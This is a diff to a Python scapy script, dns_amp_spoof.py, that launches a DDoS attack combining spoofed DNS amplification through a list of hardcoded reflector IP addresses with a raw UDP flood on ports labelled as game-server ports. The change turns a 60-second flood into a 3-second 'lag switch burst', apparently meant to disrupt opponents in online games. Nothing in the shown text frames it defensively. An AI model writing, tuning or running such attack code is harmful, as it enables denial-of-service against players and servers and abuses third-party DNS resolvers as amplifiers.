@@ -1,12 +1,12 @@
-# dns_amp_spoof.py — Hybrid amplifier with raw flood + reflection + heavy payload
+# dns_amp_spoof.py — 3-second hybrid lag switch burst
 import random
 import time
 import sys
 from scapy.all import IP, UDP, send, DNS, DNSQR, Raw
 
 # === CONFIGURATION ===
-DURATION = 60  # seconds
-RAW_FLOOD_PORTS = [7777, 8000, 9000, 12000]  # common RL server ports
+DURATION = 3  # seconds (true lag switch burst)
+RAW_FLOOD_PORTS = [7777, 8000, 9000, 12000]
 REFLECTORS = [
     "185.222.222.222", "193.110.157.123", "185.156.175.61",
     "185.130.104.181", "81.95.97.154", "185.26.122.222",
@@ -48,11 +48,11 @@ def raw_udp_flood(target_ip):
 
 # === LAUNCH HYBRID ATTACK ===
 def launch_attack(target_ip):
-    print(f"[+] Launching hybrid flood on {target_ip}...")
+    print(f"[+] Launching 3-second lag burst on {target_ip}...")
     from threading import Thread
     Thread(target=dns_amplification, args=(target_ip,), daemon=True).start()
     raw_udp_flood(target_ip)
-    print("[+] Attack complete.")
+    print("[+] Lag burst complete.")
 
 if __name__ == "__main__":
     if len(sys.argv) != 2:
